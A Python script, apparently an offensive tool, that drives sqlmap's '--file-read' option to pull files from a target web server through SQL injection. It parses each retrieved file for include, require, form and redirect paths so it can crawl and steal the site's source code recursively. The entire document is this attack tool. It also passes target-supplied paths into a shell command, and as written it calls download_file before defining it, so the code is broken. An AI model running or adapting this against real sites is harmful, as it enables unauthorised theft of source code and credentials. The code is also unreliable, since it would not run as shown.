import os
import re
import subprocess
from os.path import dirname
from shutil import rmtree

sqlmap_args = input().split()
webroot = input()
files = [input()]

while files:
    file_path = download_file(files.pop())

    if file_path:
        with open(file_path) as file:
            file_contents = file.read()

        new_files = re.findall(r"""
            require[\s_(].*?['"](.*?)['"]
            |include.*?['"](.*?)['"]
            |load\("(.*?)["?]
            |form.*?action="(.*?)["?]
            |header\("Location:\s(.*?)["?]
            |url:\s"(.*?)["?]
            |window\.open\("(.*?)["?]
            |window\.location="(.*?)["?]
        """, file_contents, re.X)

        for file in new_files:
            if not file:
                continue

            if file.startswith("/"):
                file = f"output/{webroot}{file}"
            else:
                file = f"{dirname(file_path)}/{file}"

            if os.path.exists(file):
                continue

            file = file.replace("output", "", 1)
            print(f"[+] adding {file} to queue...")

            files.append(file)


def download_file(fname):
    result = subprocess.check_output(
        f"sqlmap {' '.join(sqlmap_args)} --file-read='{fname}' --batch",
        shell=True,
        stderr=subprocess.STDOUT,
    ).decode()

    match = re.search(r"files saved to .*?(/.*?)\(same", result)
    if not match:
        return None

    output_path = f"output{fname}"
    os.makedirs(dirname(output_path), exist_ok=True)
    os.rename(match.group(1), output_path)
    print(f"[+] downloaded {fname}")

    return output_path
